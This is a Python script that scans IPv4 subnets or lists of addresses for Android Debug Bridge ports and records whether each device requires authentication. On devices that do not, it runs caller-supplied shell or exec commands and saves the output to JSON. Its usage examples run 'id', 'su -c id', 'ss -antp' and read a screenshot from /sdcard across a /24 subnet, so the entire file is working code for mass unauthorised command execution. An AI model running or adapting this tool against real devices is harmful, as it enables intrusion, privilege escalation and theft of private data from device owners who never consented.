#!/usr/bin/python3.8

import socket
import json
import base64
import getopt
import sys
import time
import logging
import random
from datetime import datetime
from adb.adbStructure import adbCommand,adbExtract
from concurrent.futures import ThreadPoolExecutor
from netaddr import IPNetwork,IPAddress 

def usage():
    print("[*] Usage: %s [ -t [IPV4 Address or Subnet] -l [file with IPv4 addresses] -p [TCP Port] -c [file with commands (optional)] -f [save output to file] -e [use exec, instead of shell (default)] -w [workers] " % sys.argv[0])
    print("[*] Example: %s -t 10.0.0.0/24 -w 15 -p 5555 -c 'id,echo $PATH,ss -antp,su -c id' -f out.json " % sys.argv[0])
    print("[*] Example: %s -t 10.0.0.0/24 -w 15 -p 5555" % sys.argv[0])
    print("[*] Example: %s -l ips-with-adb-exposed.txt -w 40 -p 5555 -c 'cat /sdcard/screencap.png' -f out.json -e" % sys.argv[0])
    print("\n")
    sys.exit(0)

def read_file(filename):
    try:
        with open(filename, "r") as f:
            targets = list(f)
            #print("[*] found file %s" % filename)
            return targets
    except Exception as e:
        print("\n[*] %s %s\n" % (e, filename))
        usage()

def write_file(filename, data):
    with open(filename, "a") as f:
        json.dump(data, f)

def receive_from(connection):

    buffer = b""
    # We set a 2 second timeout; depending on your target, this may need to be adjusted
    connection.settimeout(2)
    try:
        # keep reading into the buffer until there's no more data or we time out
        while True:
            data = connection.recv(4096)
            if data:
                buffer += bytes(data)
            else:
                break
    except:
        pass

    return buffer

try:
    opts, args = getopt.getopt(sys.argv[1:],"t:p:w:l:f:c:e",["target","port","workers","list","file","cmds","exec"])
except getopt.GetoptError as err:
    print(str(err))
    usage()

target = None
workers = None
targetPort = None
commands = None
targetList = None
outFile = None
adbExec = None

for o, a in opts:
    if o in ("-t", "--target"):
        try:
            target = IPNetwork(a)
        except Exception as e:
            print("\n[*] could not convert \"%s\" to an IP network\n" % a) 
            usage()
    if o in ("-p", "--port"):
        targetPort = int(a)
    if o in ("-w", "--workers"):
        workers = int(a)
    if o in ("-l", "--list"):
        if target:
            targetList = True
        target = read_file(a)
    if o in ("-f", "--file"):
        outFile = a
    if o in ("-e", "--exec"):
        adbExec = True
    if o in ("-c", "--cmds"):
        commands = read_file(a)

if target and targetList:
    usage()
if target and targetList:
    usage()
elif ((target or targetList) and targetPort):
    pass
else:
    usage()

def discover_host(target, port=targetPort, cmd=commands, logfile=outFile, adb_exec=adbExec):

    data = adbCommand("CNXN", 16777217, 256*4096, "host::features=abb_exec,fixed_push_symlink_timestamp,abb,stat_v2,apex,shell_v2,fixed_push_mkdir,cmd").adbPacket
    validConnect = False
    gotClose = False
    lastCommand = b""
    logData = {}

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((str(target),port))
        client.send(data)
        recv_buffer = receive_from(client)
    except Exception as e:
        return

    if len(recv_buffer):
        logData["ts"] = str(datetime.utcnow()).split(".")[0] + " UTC"
        logData["ip"] = str(target)
        adb_header = adbExtract(recv_buffer).adbMessages
        for messages in adb_header:
            if messages["command"] in (b"CNXN", b"AUTH"):
                validConnect = True
                if messages["command"] == b"AUTH":
                    logData["secured"] = True
                else:
                    logData["device_header"] = base64.b64encode(messages["payload"]).decode('utf-8')
                    logData["secured"] = False
                break

    if validConnect and cmd:

        logData["cmds"] = []

        for command in cmd:
            # open a connection to execute a command
            gotOkay = False
            result = b""
            closeCounter = 0
            recv_buffer = b""
            lastCommand = b""

            while gotOkay == False and closeCounter < 1:

                localId = random.randint(1,4294967295)

                if adb_exec:
                    payload = "exec:" + command + "\x00"
                else:
                    payload = "shell:" + command + "\x00"
                data = adbCommand("OPEN", localId, 0, payload).adbPacket
                client.send(data)
                recv_buffer = receive_from(client)

                if len(recv_buffer):
                    adb_header = adbExtract(recv_buffer).adbMessages
                    for messages in adb_header:
                        if messages["command"] == b"OKAY":
                            gotOkay = True
                            remoteId = int.from_bytes(messages["arg0"], 'little')
                        if messages["command"] == b"WRTE" and gotOkay:
                            result += messages["payload"]
                        lastCommand = messages["command"]

                closeCounter += 1

            if (lastCommand == b"WRTE" and gotOkay) or lastCommand == b"CLSE":
                # send okays until we get a close
                while True:
                    if lastCommand == b"CLSE":
                        break
                    else:
                        data = adbCommand("OKAY", localId, remoteId, "").adbPacket
                        client.send(data)
                        recv_buffer = receive_from(client)
                        if len(recv_buffer):
                            adb_header = adbExtract(recv_buffer).adbMessages
                            for messages in adb_header:
                                if messages["command"] == b"WRTE":
                                    result += messages["payload"]
                            lastCommand = messages["command"]
                        else:
                            break

                logData["cmds"].append({"cmd" : command, "data" : base64.b64encode(result).decode('utf-8')})

    if logData:
        return logData
    else:
        return
    

# start the adb scanner
with ThreadPoolExecutor(max_workers=workers) as executor:
    results = executor.map(discover_host,target)

# write results to stdout and output if specified
for i in list(results):
    if i == None:
        pass
    else:
        if outFile:
            write_file(outFile,i)
        else:
            print(json.dumps(i))
